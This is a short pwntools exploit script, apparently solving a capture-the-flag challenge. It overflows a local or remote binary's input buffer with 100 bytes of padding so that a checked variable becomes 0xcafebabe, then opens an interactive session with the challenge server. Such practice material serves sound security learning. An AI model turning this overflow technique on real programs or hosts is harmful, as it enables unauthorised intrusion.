#!/usr/bin/env python
import pwn

pwn.context.terminal = ["st", "-e", "sh", "-c"]
GDBSCRIPT = f"""
b * main + 84
c
"""
addr_to_offset = lambda num: pwn.cyclic_find(num.to_bytes(4, "little"))


def get_challenge(elf):
    if pwn.args.REMOTE:
        challenge = pwn.remote("206.189.123.169", 5006)
    elif pwn.args.GDB:
        challenge = pwn.process(elf.path)
        pwn.gdb.attach(
            challenge,
            gdbscript=GDBSCRIPT
        )
    else:
        challenge = pwn.process(elf.path)

    return challenge


def main():
    elf = pwn.ELF("./main")

    challenge = get_challenge(elf)

    secret = 0xcafebabe
    challenge.sendline(b"A" * 100 + pwn.p32(secret))

    challenge.interactive()


if __name__ == "__main__":
    main()
